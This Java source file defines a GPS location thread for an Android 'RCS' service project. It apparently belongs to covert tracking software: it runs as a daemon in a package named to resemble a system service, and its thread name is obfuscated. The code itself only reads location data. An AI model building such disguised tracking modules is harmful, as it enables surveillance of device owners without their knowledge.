/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : GPSLocator.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module.position;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Looper;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public abstract class GPSLocator extends Thread {
	private static final String TAG = "GPSLocator"; //$NON-NLS-1$
	protected LocationManager lm;
	protected LocationListener listener;

	protected String provider = LocationManager.GPS_PROVIDER;

	public GPSLocator() {
		setDaemon(true);
		setName(Messages.getString("12.0")); //$NON-NLS-1$
		lm = (LocationManager) Status.getAppContext().getSystemService(Context.LOCATION_SERVICE);
	}

	public abstract void initLocationUpdates();
	
	@Override
	public void run() {
		Looper.prepare();
		initLocationUpdates();
		
		Looper.loop();
	}
	
	public GPSLocator(LocationListener listener) {
		setListener(listener);
	}

	protected void setListener(LocationListener listener) {
		this.listener = listener;
	}

	public Location getLastKnownPosition(){		
		return lm.getLastKnownLocation(provider);
	}

	public void halt() {
		lm.removeUpdates(listener);
		
		lm = null;
	}
}